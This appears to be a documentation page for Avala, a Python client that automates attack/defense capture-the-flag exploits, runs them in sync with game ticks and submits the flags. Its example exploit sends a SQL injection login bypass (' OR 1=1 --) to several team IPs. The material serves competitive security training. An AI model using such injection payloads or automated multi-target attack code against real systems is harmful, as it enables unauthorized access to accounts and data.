---
hide:
- toc
---

# Avala client overview

Each player on the team should have **Avala client** installed on their own machine. Avala client is shipped as a Python library and handles the following:

- Provides a lightweight intuitive interface for writing exploits.
- Executes attacks in parallel in sync with the game ticks.
- Automatically extracts and sends flags for submission.

---

When developing exploits with Avala, you can focus on the core logic of the attack. Avala will handle all the surrounding tasks, such as obtaining target IPs, fetching corresponding flag IDs, keeping attacks in sync with the game tick, and extracting flags from any strings or objects that you return.

The following example shows a simple login bypass using a username provided in a flag ID (e.g. `"{\"username\": \"johndoe\"}"`). After a successful login, the flag will be *somewhere* in the response and Avala will pick it up for submitting.

```python
from avala import exploit  # (1)!


@exploit(
    service="foobar",  # (2)!
    targets=["10.10.19.1", "10.10.20.1", "10.10.21.1"],  # (3)!
)
def attack(target: str, flag_ids: str):  # (4)!
    username = json.loads(flag_ids)["username"]  # (5)!

    response = requests.post(  # (6)!
        f"http://{target}:5000/login",
        json={"username": username, "password": "' OR 1=1 --"},
    )

    return response.text  # (7)!
```
{ .annotate }

1.  :material-import: Import the `@exploit` decorator — you will use it to register and configure your exploit functions.
2.  :material-cog: Pick the service you want to attack. You will find service names in the _flag IDs_ or by running `avl services`.  
3.  :material-target: Aim at specific teams, or let Avala get all the targets automatically. :magic_wand:
4.  :fontawesome-solid-brain: Avala plugs in the target IP and flag IDs. You handle the fun part.
5.  :bulb: Flag IDs come in different types and sizes. This service returns a stringified JSON `"{\"username\": \"johndoe\"}"`.
6.  :sparkles: Just the exploit itself, nothing extra. 
7.  :triangular_flag_on_post: Just return the whole string. Or a list, a dict, or _anything really_.<br><br>As long as its string representation _contains_ a flag (or multiple), Avala will extract it and submit it for you.

---

To get started, first you will need to prepare your workspace and [install the Avala library](./setup.md). 🚀
